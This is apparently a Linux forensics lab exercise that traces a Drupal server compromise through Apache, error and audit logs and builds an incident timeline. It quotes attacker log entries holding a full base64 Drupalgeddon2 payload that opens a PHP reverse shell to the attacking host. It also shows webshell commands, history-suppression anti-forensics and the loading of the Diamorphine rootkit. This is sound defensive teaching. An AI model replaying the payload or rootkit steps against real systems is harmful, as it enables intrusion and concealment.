@@ -1,0 +1,464 @@
+<HTML>
+<HEAD>
+   <TITLE>Exercise 13 -- Linux Forensics</TITLE>
+   <link rel="stylesheet" type="text/css" href="../style/Sec506.css">
+</HEAD>
+<BODY>
+
+<p align="center">
+   <span class="page_title">Exercise 13: More Log Analysis</span><br>
+   <span class="page_subtitle">Hands-On Exercise</span>
+</p>
+
+<h1>Goals For This Lab<p>
+
+<ol>
+<li>Locate web server logs</li><p>
+<li>Find logs related to system compromise</li><p>
+<li>Decode and identify exploit</li><p>
+<li>Investigate web shell usage</li:><p>
+<li>Find relevant information in error logs</li><p>
+<li>Update incident timeline with new findings</li><p>
+<li>BONUS: Examine Linux kernel audit logs</li><p>
+</ol>
+</h1>
+
+
+<h1>Before You Get Started</h1>
+
+Note that for this lab to work, you will need to have our compromised
+web server image mounted. If your 
+<tt>/mnt/test/data</tt> directory is empty, follow the steps in the
+<b>Before You Get Started</b> section of
+<a href="../Ex_10/index.html">Exercise 10</a> to mount the image.</p>
+
+
+<h1>1. Find the Web Logs</h1>
+
+<p>While you will typically find Linux web logs under a subdirectory
+in <tt>/var/log</tt>, the exact name of the subdirectory can vary.
+Common names include "<tt>httpd</tt>", "<tt>apache*</tt>", and "<tt>nginx</tt>".
+Let's check the <tt>/var/log</tt> directory in the image of our
+compromised web server:</p>
+
+<pre>
+[root@LAB lab11]# <b>cd /mnt/test/data/var/log</b>
+[root@LAB log]# <b>ls</b>
+alternatives.log  dbconfig-common  dmesg.4.gz  lastlog     samba
+apache2           dist-upgrade     dpkg.log    mail.err    syslog
+apt               dmesg            faillog     mail.log    udev
+auth.log          dmesg.0          fsck        mysql       unattended-upgrades
+boot.log          dmesg.1.gz       installer   mysql.err   upstart
+bootstrap.log     dmesg.2.gz       kern.log    mysql.log   wtmp
+btmp              dmesg.3.gz       landscape   postgresql
+[root@LAB log]# <b>ls apache2</b>
+access.log  error.log  other_vhosts_access.log
+[root@LAB log]# <b>cd apache2</b>
+</pre>
+
+<p>The <tt>access_log</tt> is where you'll find the data about web server
+requests, and <tt>error_log</tt> is where the errors go, as the name implies.</p>
+
+
+<h1>2. Looking for an Exploit</h1>
+
+<p>So far we know that the attacker was logging in as user <tt>mail</tt> from 
+192.168.210.131. And we know the executable we believe was used as a privilege
+escalation appeared in <tt>/tmp</tt> at 11:04:14 UTC on Oct 5, 2019.</p>
+
+<p>While it is certainly possible that the attacker launched the initial exploit
+of the system from a completely different IP than 192.168.210.131, let's see if
+we catch any malicious web activity from this IP address:</p>
+
+<pre>
+[root@LAB apache2]# <b>grep 192.168.210.131 access.log</b>
+<i>[... snip ...]</i>
+192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=user/password&name%5b%23post_render
+%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZyg
+wKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudC
+cpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJ
+zsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0
+KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSg
+kZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsIC
+RpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBka
+WUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsg
+Y2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmV
+hZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuI
+D0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2Ug
+J3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29
+ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQk
+FMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ
+3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIp
+OyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b&name%5b%23type%5d=markup 
+HTTP/1.1" 200 13983 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=file/ajax/name/%23value/form-tggMqw
+bT3cRyS3SWuIRNGj_FB_5N-cux23-NHVF0NrA HTTP/1.1" 200 1977 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1)"
+192.168.210.131 - - [05/Oct/2019:13:01:29 +0200] "POST /jabc/?q=user/password&name%5b%23post_render
+%5d%5b%5d=passthru&name%5b%23markup%5d=php%20-r%20%27eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9
+yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc2
+9ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5c
+GUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAk
+ZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiB
+pc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2
+Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJ
+HNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2gg
+KCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4
+gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsI
+CRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190
+eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V
+0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXS
+A9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpI
+CYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5j
+dGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b%27&name
+%5b%23type%5d=markup HTTP/1.1" 200 14021 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+<i>[... snip ...]</i>
+</pre>
+
+<p>Even if the request had been launched from a different IP, and even in a much bigger log file
+I think these requests would stand out as abnormal. Aside from the obvious "look at that big
+blob of base64 encoding" aspect of these requests, notice that they are POST requests that also
+contain query string parameters ("<tt>/jabc/?q=user...</tt>"), which are typical in GET requests.</p>
+
+<p>Things are a bit difficult to read because we've got both base64 encoding going on
+here and the usual HTML URL encoding ("<tt>%5b</tt>" and so on). But you can see some recognizable
+strings in this mess, like "<tt>post_render</tt>" and "<tt>passthru</tt>".
+If you Google for "Drupal exploit post_render" you'll find a lot of hits related to
+CVE-2018-7600, aka "Drupalgeddon2".</p>
+
+<p>The timestamps are written in CET, just like the Syslog timestamps in the previous exercise.
+At least the web logs show us the offset from UTC--that's the "<tt>+0200</tt>" portion of
+the timestamp. So these requests hit at 11:01 UTC, shortly before the suspicious executable
+showed up in <tt>/tmp</tt>.</p>
+
+
+<h1>3. Decoding the Exploit</h1>
+
+<p>You may have your own preferred way of decoding URLs like this one, but I'm going to
+show you a command-line approach. First we need to translate all the hex-encoded bytes
+("<tt>%5b</tt>" and so on) into their ASCII equivalents. There's a well-known Perl
+idiom for doing this:</p>
+
+<pre>
+[root@LAB apache2]# <b>echo '/jabc/?q=user/password&name%5b%23post_render%5d%5b%5d=passthru&name
+%5b%23markup%5d=php%20-r%20%27eval%28base64_decode%28Lyo8P3BocCAvKi...<i>&lt;snip&gt;</i>...IH0gZGllKCk7
+%29%29%3b%27&name%5b%23type%5d=markup' | perl -pe 's/%(..)/chr(hex($1))/ge'</b>
+/jabc/?q=user/password&name[#post_render][]=passthru&name[#markup]=php -r 'eval(base64_decode(
+Lyo8P3BocCAvKi...<i>&lt;snip&gt;</i>...IH0gZGllKCk7));'&name[#type]=markup
+</pre>
+
+<p>The Perl expression uses a substitution operator ("<tt>s/.../.../</tt>"). The substitution
+matches a percent sign followed by any two characters ("<tt>%(..)</tt>"). The replacement on
+the righthand side calls <tt>hex()</tt> on the two characters we matched from the lefthand side
+(represented as "<tt>$1</tt>"). The <tt>hex()</tt> function converts the two ASCII characters back 
+into their binary
+numeric value. The <tt>chr()</tt> function converts that value into a character.</p>
+
+<p>In the decoded output it's a bit easier to see that the code is calling <tt>eval()</tt>
+on whatever code is in the base64 encoded blob. Happily, Linux has a built-in base64 decoding
+tool which comes in handy right now:</p>
+
+<pre>
+[root@LAB apache2]# <b>echo Lyo8P3BocCAvKi...<i>&lt;snip&gt;</i>...IH0gZGllKCk7 | base64 -di</b>
+/*&lt;?php /**/ error_reporting(0); $ip = '192.168.210.131'; $port = 4444; if (($f = 'stream_socket_client') 
+&& is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') 
+&& is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && 
+is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); 
+if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { 
+<i>[...]</i>
+</pre>
+
+<p>"<tt>base64 -d</tt>" decodes base64 input. The <tt>-i</tt> option tells <tt>base64</tt> to ignore
+any garbage in the base64 encoded data.</p>
+
+<p>Without analyzing the code too closely, this looks like code to set up a socket connection back
+to 192.168.210.131 on port 4444/tcp. And 4444 is the default Metasploit port, which allows us to
+speculate a bit about the attacker's toolchain. You may want to compare Rapid7's exploit for 
+CVE-2018-7600 with the code we just unpacked from the logs and see how they compare.</p>
+
+
+<h1>4. How About That Webshell?</h1>
+
+<p>We saw in our earlier investigations that the attackers apparently created a webshell
+called "<tt>update.php</tt>" on Oct 5 at 11:17:42 UTC. 
+Let's check the web logs for any access to this file:</p>
+
+<pre>
+[root@LAB apache2]# <b>grep update.php access.log</b>
+192.168.210.131 - - [05/Oct/2019:13:17:48 +0200] "GET /jabc/scripts/update.php HTTP/1.1" 200 223 "http://192.168.210.135/jabc/scripts/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+192.168.210.131 - - [05/Oct/2019:13:17:54 +0200] "GET /jabc/scripts/update.php?cmd=ls HTTP/1.1" 200 244 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+</pre>
+
+<p>Seconds after the webshell was created, we see access from our suspect IP address.
+I would speculate that this is simply the attackers testing the functionality of the webshell.</p>
+
+
+
+<h1>5. Always Check Your <tt>error_log</tt></h1>
+
+<p>There are only a limited number of entries from Oct 5 in the <tt>error_log</tt>,
+but most of them are relevant to our investigation:</p>
+
+<pre>
+<i>[... older entries not shown ...]</i>
+[Sat Oct 05 11:41:58.640547 2019] [mpm_prefork:notice] [pid 1367] AH00163: Apache/2.4.7 (Ubuntu) 
+       PHP/5.5.9-1ubuntu4.14 configured -- resuming normal operations
+[Sat Oct 05 11:41:58.641391 2019] [core:notice] [pid 1367] AH00094: Command line: '/usr/sbin/apache2'
+PHP Notice:  Use of undefined constant Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4x
+       <i>[... snip ...]</i>A9IHVucGFj - assumed 'Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwI
+       D0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID in Command line code on line 1
+PHP Notice:  Use of undefined constant Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4x
+       <i>[... snip ...]</i>A9IHVucGFj - assumed 'Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwI
+       D0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID in Command line code on line 1
+[Sat Oct 05 13:17:48.483527 2019] [:error] [pid 1789] [client 192.168.210.131:41888] PHP Notice:  
+       Undefined index: cmd in /var/www/html/jabc/scripts/update.php on line 2, referer: 
+       http://192.168.210.135/jabc/scripts/
+[Sat Oct 05 13:17:48.483593 2019] [:error] [pid 1789] [client 192.168.210.131:41888] PHP Warning:  
+       system(): Cannot execute a blank command in /var/www/html/jabc/scripts/update.php on line 2, 
+       referer: http://192.168.210.135/jabc/scripts/
+</pre>
+
+<p>We have two lines of logs for the normal web server startup. Then we see two messages without
+timestamps from PHP. The base64 code here matches the base64 strings from the exploit we decoded 
+from the <tt>access_log</tt>. Then we see two error messages related to the first access of the
+<tt>update.php</tt> webshell.</p>
+
+<p>Honestly, the new information from the <tt>error_log</tt> doesn't tell us much we didn't know
+already. Clearly the attackers misfired on their first attempt at running the webshell remotely.
+But since we see no errors related to the second webshell access, we can assume that they figured
+out their mistake.</p>
+
+
+
+<h1>Summary of Findings</h1>
+
+<p>Plugging the findings from the web server logs into our incident timeline, helps clear
+up the mystery of how and when the attack started:</p>
+
+<pre>
+2019-10-05 11:01:27    Metasploit? CVE-2018-7600? exploit launched from 192.168.210.131
+2019-10-05 11:01:29    Metasploit? CVE-2018-7600? exploit launched from 192.168.210.131
+
+2019-10-05 11:04:14    /tmp/apache-xTRhUVX executable dropped by www-data
+                       (CVE-2015-1328 privilege escalation? compiled on system?)
+
+2019-10-05 11:06:38    root "sudo useradd ... php"
+
+2019-10-05 11:08:31    chsh command runs, user mail shell set to /bin/bash
+
+2019-10-05 11:09:03    chpasswd sets password for user mail
+
+2019-10-05 11:09:18    usermod adds mail to "sudo" group
+
+2019-10-05 11:13:53    First login by user mail from 192.168.210.131
+
+2019-10-05 11:14:04    mail account first "sudo su -"
+
+2019-10-05 11:14:38    /etc/passwd modifications (php account moved via vim?)
+
+2019-10-05 11:17:42    /var/www/html/jabc/scripts/update.php webshell
+                       added by root account
+
+2019-10-05 11:17:49    update.php webshell access from 192.168.210.131
+                       (errors in Apache error_log)
+
+2019-10-05 11:17:54    update.php webshell access from 192.168.210.131
+
+2019-10-05 11:21:34    passwd command fails to update php account
+
+2019-10-05 11:21:39    passwd command used to change php password
+
+2019-10-05 11:23:34    last login for mail user from 192.168.210.131
+
+2019-10-05 11:23:39    last "sudo su -" for mail user
+</pre>
+
+<p>Honestly, that's a pretty good summary of the incident right there.
+But we can glean a few more details by looking at the user artifacts
+on the system-- particularly user command history. More on that in the
+next lab exercise.</p>
+
+
+
+<h1>BONUS INVESTIGATION: Audit Logs</h1>
+
+<p>In an earlier lab exercise, we looked at the memory image of a system that had
+been compromised with the Diamorphine LKM rootkit. The disk image from that system
+is not available. However, I infected another one of my lab machines with the same
+rootkit, and this time I enabled Linux kernel auditing so we could see what those 
+logs might look like. On my test system I increased auditing levels so that attempts
+to install new kernel modules would be flagged and logged with the descriptive
+keyword "kernelmod". I also enabled keystoke logging for the root user.</p>
+
+<p>I put a copy of the audit log in the <tt>/images/lab13</tt> directory. Let's
+go there and try a simple query with <tt>ausearch</tt>:</p>
+
+<pre>
+[root@LAB apache2]# <b>cd /images/lab13/</b>
+[root@LAB lab13]# <b>ls</b>
+audit.log
+[root@LAB lab13]# <b>ausearch -if audit.log -f diamorphine</b>
+----
+time->Wed Mar 18 19:35:56 2020
+type=USER_CMD msg=audit(1584560156.040:471): pid=11903 uid=1000 auid=1000 ses=5 
+    subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 
+    msg='cwd="/home/lab/zaq123edcx-diamorphine" cmd="/bin/bash" terminal=pts/0 res=success'
+</pre>
+
+<p>Read this as UID 1000 executing <tt>/bin/bash</tt> from the <tt>/home/lab/zaq123edcx-diamorphine</tt>
+directory. Unfortunately our search does not turn up any other references to files with
+the string "<tt>diamorphine</tt>" in them. But if the rest of the disk image were available,
+I would definitely want to check out this suspicious directory!</p>
+
+<p>Since we got a hit on the name of a known malicious LKM, let's see if the rules
+that were added to detect kernel modifications paid off for us:</p>
+
+<pre>
+[root@LAB lab13]# <b>ausearch -if audit.log -k kernelmod</b>
+<i>[... snip ...]</i>
+----
+time->Wed Mar 18 19:30:00 2020
+type=PROCTITLE msg=audit(1584559800.470:280): proctitle=2F7362696E2F6D6F6470726F6265002D71002D2D007463705F6C70
+type=KERN_MODULE msg=audit(1584559800.470:280): name="tcp_lp"
+type=SYSCALL msg=audit(1584559800.470:280): arch=c000003e syscall=175 success=yes exit=0 a0=7f6260 
+   a1=1e15 a2=41a96e a3=7f2500 items=0 ppid=10870 pid=10871 auid=4294967295 uid=0 gid=0 euid=0 suid=0 
+   fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="modprobe" exe="/usr/bin/kmod" 
+   subj=system_u:system_r:insmod_t:s0 key="kernelmod"
+----
+time->Wed Mar 18 19:36:14 2020
+type=PROCTITLE msg=audit(1584560174.567:477): proctitle=696E736D6F64006469616D6F727068696E652E6B6F
+type=KERN_MODULE msg=audit(1584560174.567:477): name="diamorphine"
+type=SYSCALL msg=audit(1584560174.567:477): arch=c000003e syscall=313 success=yes exit=0 a0=3 
+   a1=41a96e a2=0 a3=3 items=0 ppid=11911 pid=11943 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 
+   egid=0 sgid=0 fsgid=0 tty=pts0 ses=5 comm="insmod" exe="/usr/bin/kmod" 
+   subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="kernelmod"
+</pre>
+
+<p>This seems exciting at first because you get a lot of output in response to the
+query. However, it turns out that most of these messages are just normal system
+behavior. For example, let's convert the "<tt>type=PROCTITLE</tt>" message from
+19:30:00:</p>
+
+<pre>
+[root@LAB lab13]# <b>echo 2F7362696E2F6D6F6470726F6265002D71002D2D007463705F6C70 | xxd -r -p | tr \\000 ' '; echo</b>
+/sbin/modprobe -q -- tcp_lp
+</pre>
+
+<p>This is just the operating system loading a standard kernel module at boot time.
+If you go back further in the output, you will see more of this. So one of the problems
+with kernel level auditing is lack of discernment. If you configure logging of kernel
+modifications, you get not only malicious activity but also normal system behaviors.
+Hopefully the malicious activity is rare, but that makes it all the more difficult
+to spot in all of the ususal system behavior.</p>
+
+<p>However, the last entry above definitely turns out to be relevant to our LKM. Let's convert the
+"<tt>type=PROCTITLE</tt>" string there:</p>
+
+<pre>
+[root@LAB lab13]# <b>echo 696E736D6F64006469616D6F727068696E652E6B6F | xxd -r -p | tr \\000 ' '; echo</b>
+insmod diamorphine.ko
+</pre>
+
+<p>Putting that together with the other related audit log entries, we have somebody logged
+in as UID 1000 ("<tt>auid=1000</tt>") but running as root ("<tt>uid=0</tt>") manually installing
+the <tt>diamorphine.ko</tt> module.</p>
+
+<p>But which user is UID 1000? Maybe we can get some clues from the login history on the system:</p>
+
+<pre>
+[root@LAB lab13]# <b>aulast -f audit.log</b>
+lab      ssh          192.168.176.1    Fri Mar 13 23:49 - 23:49  (00:00)
+lab      ssh          192.168.176.1    Fri Mar 13 23:51 - 23:51  (00:00)
+lab      ssh          192.168.176.1    Fri Mar 13 23:51 - 23:51  (00:00)
+lab      pts/2        192.168.176.1    Fri Mar 13 23:37 - 23:55  (00:17)
+lab      ?            ?                Fri Mar 13 23:24 - 19:16  (4+19:52)
+lab      ssh          192.168.176.1    Wed Mar 18 19:20 - 19:20  (00:00)
+lab      pts/0        192.168.176.1    Wed Mar 18 19:18 - 19:27  (00:08)
+lab      pts/1        192.168.176.1    Wed Mar 18 19:21 - 19:27  (00:05)
+lab      pts/2        192.168.176.1    Fri Mar 13 23:55 - 19:27  (4+19:31)
+reboot   system boot  3.10.0-693.el7.x Fri Mar 13 19:22 - 19:27  (5+00:04)
+lab      ?            ?                Wed Mar 18 19:29 - 19:30  (00:00)
+lab      pts/0        192.168.176.1    Wed Mar 18 19:30 - 19:33  (00:02)
+lab      ssh          192.168.176.1    Wed Mar 18 19:34 - 19:34  (00:00)
+lab      ssh          192.168.176.1    Wed Mar 18 22:16 - 22:17  (00:00)
+reboot   system boot  3.10.0-1062.12.1 Wed Mar 18 19:27 
+lab      pts/0        192.168.176.1    Wed Mar 18 19:34   still logged in
+lab      pts/1        192.168.176.1    Wed Mar 18 19:36   still logged in
+lab      pts/2        192.168.176.1    Wed Mar 18 19:42   still logged in
+lab      ssh          192.168.176.1    Wed Mar 18 23:15   still logged in
+</pre>
+
+<p>Because the <tt>aulast</tt> command uses data from the <tt>audit.log</tt>
+file, the entries are in chronological order, which is opposite from the
+normal <tt>last</tt> command. So the most recent logins are at the
+<i>bottom</i> of the output. We see multiple logins as the "<tt>lab</tt>"
+user from IP 192.168.176.1. So I would speculate that "<tt>lab</tt>"
+is UID 1000.</p>
+
+<p>I turned on keystroke logging for <tt>root</tt>, and we can see those
+logs with "<tt>aureport --tty</tt>":</p>
+
+<pre>
+[root@LAB lab13]# aureport -if audit.log --tty
+
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+1. 03/18/2020 19:32:30 373 1000 ? 3 bash "vi /etc/pam.d/system-auth",&lt;ret&gt;
+2. 03/18/2020 19:32:30 374 1000 ? 3 ? "vi /etc/pam.d/system-auth"
+3. 03/18/2020 19:32:47 376 1000 ? 3 vi "$:$",&lt;ret&gt;,"$hhhh FDDalab",&lt;esc&gt;,":wq",&lt;ret&gt;
+4. 03/18/2020 19:32:54 377 1000 ? 3 bash "/etc/pam.d/password-auth",&lt;ret&gt;
+5. 03/18/2020 19:32:54 378 1000 ? 3 ? "/etc/pam.d/password-auth"
+6. 03/18/2020 19:32:57 379 1000 ? 3 bash "vi /etc/pam.d/password-auth",&lt;ret&gt;
+7. 03/18/2020 19:32:57 380 1000 ? 3 ? "vi /etc/pam.d/password-auth"
+8. 03/18/2020 19:33:06 381 1000 ? 3 vi ":$",&lt;ret&gt;,"$hhhDalab",&lt;esc&gt;,":wq",&lt;ret&gt;
+9. 03/18/2020 19:33:14 382 1000 ? 3 bash "export HISTFILE=/dev/null",&lt;ret&gt;
+10. 03/18/2020 19:33:14 383 1000 ? 3 ? "export HISTFILE=/dev/null"
+11. 03/18/2020 19:33:16 384 1000 ? 3 bash &lt;^D&gt;
+12. 03/18/2020 19:35:10 463 1000 ? 5 vim &lt;esc&gt;,"[2;2R",&lt;esc&gt;,"[&gt;1;3409;0cjjjjjjjjjj                      Dazaq123edcx\",&lt;esc&gt;,":wq",&lt;ret&gt;
+13. 03/18/2020 19:36:14 475 1000 ? 5 bash "insm",&lt;tab&gt;,"dia",&lt;tab&gt;,"ko",&lt;ret&gt;
+14. 03/18/2020 19:36:14 476 1000 ? 5 ? "insmod diamorphine.ko"
+15. 03/18/2020 19:36:17 478 1000 ? 5 bash "ls ..",&lt;ret&gt;
+16. 03/18/2020 19:36:17 479 1000 ? 5 ? "ls .."
+17. 03/18/2020 19:36:50 509 1000 ? 5 bash "ps -ef | grep sshd",&lt;ret&gt;
+18. 03/18/2020 19:36:50 510 1000 ? 5 ? "ps -ef | grep sshd"
+19. 03/18/2020 19:37:37 511 1000 ? 5 bash "kill -31 11565 11571 11958 11963",&lt;ret&gt;
+20. 03/18/2020 19:37:37 512 1000 ? 5 ? "kill -31 11565 11571 11958 11963"
+21. 03/18/2020 19:37:51 513 1000 ? 5 bash "ps -ef | grep bash",&lt;ret&gt;
+22. 03/18/2020 19:37:51 514 1000 ? 5 ? "ps -ef | grep bash"
+23. 03/18/2020 19:38:16 515 1000 ? 5 bash "kill -31 11575 11911 11970",&lt;ret&gt;
+24. 03/18/2020 19:38:16 516 1000 ? 5 ? "kill -31 11575 11911 11970"
+25. 03/18/2020 19:38:27 517 1000 ? 5 bash "ps -ef | grpe l",&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,"ep lab",&lt;ret>
+26. 03/18/2020 19:38:27 518 1000 ? 5 ? "ps -ef | grep lab"
+<i>[... snip ...]</i>
+</pre>
+
+<p>The modifications to <tt>system-auth</tt> and <tt>password-auth</tt> are me
+adjusting the keystroke logging settings. Then you can see me doing a little
+anti-forensics with "<tt>export HISTFILE=/dev/null</tt>" (more on that coming up).</p>
+
+<p>At 19:35:10 I'm actually editing one of the Diamorphine source code files
+and setting "<tt>zaq123edcx</tt>" as the "magic prefix" Diamorphone uses to 
+decide which files and directories it should hide. Then I <tt>insmod</tt>
+the kernel module (I compiled the module as a non-root user in another terminal window).</tt>
+
+<p>After that I'm doing "<tt>ls ..</tt>" to verify that Diamorphine is hiding
+the installation directory I'm sitting in. And I use "<tt>kill -31</tt>" to hide
+multiple processes. The "<tt>ps -ef</tt>" commands are just verification that
+the processes are hidden, but they also give some insight into exactly which
+processes I'm tring to hide. For example at 19:37:51 I'm trying "<tt>ps -ef | grep bash</tt>",
+which seems to imply I'm trying to hide shell processes on the system, probably
+my own.</p>
+
+<p>The keystroke logs go on and on. If you read further you will see me acquiring disk
+and memory from the system, hopefully for a future lab exercise!</p>
+
+
+<h1> </h1>
+<hr>
+<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Linux Forensics</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Hal Pomeranz</span> is licensed under a 
+<br><a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+
+</BODY>
+</HTML>
